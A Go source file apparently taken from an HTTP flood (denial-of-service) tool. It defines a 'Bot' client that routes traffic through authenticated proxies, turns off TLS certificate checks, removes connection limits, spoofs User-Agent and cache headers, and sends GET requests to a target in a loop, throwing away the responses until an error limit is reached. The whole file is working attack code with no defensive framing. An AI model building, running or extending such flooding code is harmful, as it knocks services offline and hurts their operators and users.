package pkg

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"strings"

	log "github.com/sirupsen/logrus"
)

type Bot struct {
	c         *http.Client
	req       *http.Request
	id        int
	withProxy bool
}

func NewBot(ctx context.Context, id int, proxy *Proxy, withTLSproxy bool) (*Bot, error) {
	// TODO: adjust constants
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	tr.MaxIdleConns = 0    // 0 - no limit
	tr.MaxConnsPerHost = 0 // 0 - no limit
	tr.IdleConnTimeout = 0
	tr.ReadBufferSize = 10

	withProxy := false
	if proxy != nil {
		proxyURL := proxy.IP
		if !strings.HasPrefix(proxy.IP, "http") {
			switch withTLSproxy {
			case true:
				proxyURL = "https://" + proxy.IP
			default:
				proxyURL = "http://" + proxy.IP
			}
		}
		url, err := url.Parse(proxyURL)
		if err != nil {
			return nil, err
		}
		tr.Proxy = http.ProxyURL(url)
		tr.ProxyConnectHeader = http.Header{}
		basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Auth))
		tr.ProxyConnectHeader.Add("Proxy-Authorization", basicAuth)
		withProxy = true
	}

	b := &Bot{
		id:        id,
		withProxy: withProxy,
		c:         &http.Client{Transport: tr},
	}

	return b, nil
}

func newGetReq(ctx context.Context, target string) (*http.Request, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return nil, err
	}
	// TODO: add some useful headers
	req.Header.Add("User-Agent", GetUserAgent())
	req.Header.Add("Cache-Control", "no-store, max-age=0")
	req.Header.Add("Accept", "application/json, text/plain, */*")
	req.Header.Add("Accept-Language", "ru")
	req.Header.Add("x-forward-proto", "https")
	req.Header.Add("Accept-Encoding", "gzip, deflate, br")

	// dumpedBody, _ := httputil.DumpRequest(req, true)

	return req, nil
}

func toDevNull(readCloser io.ReadCloser) error {
	defer readCloser.Close()
	_, err := ioutil.ReadAll(readCloser)
	if err != nil {
		return err
	}
	return nil
}

func (b *Bot) Start(ctx context.Context, target string, maxErrCount int, counter chan<- bool) {
	log := log.WithField("bot", b.id)

	select {
	case <-ctx.Done():
		log.Println("is canceld")
	default:
	}

	errCount := 0
	for errCount < maxErrCount {
		select {
		case <-ctx.Done():
			return
		default:
			req, err := newGetReq(ctx, target)
			if err != nil {
				log.Errorf("Під час створення запиту: %v", err)
				errCount++
				continue
			}

			resp, err := b.c.Do(req)

			status := true
			if err != nil {
				status = false
				errCount++
				if resp != nil {
					log.Errorf("%v (%d %s)", err, resp.StatusCode, http.StatusText(resp.StatusCode))
				} else if !errors.Is(err, context.Canceled) {
					log.Errorln(err)
				}
			} else {
				if resp.StatusCode != http.StatusOK {
					status = false
					errCount++
					log.Errorf("%d %s", resp.StatusCode, http.StatusText(resp.StatusCode))
				}
				toDevNull(resp.Body)
			}

			select {
			case <-ctx.Done():
				return
			case counter <- status:
			}
		}
		runtime.Gosched()
	}
}
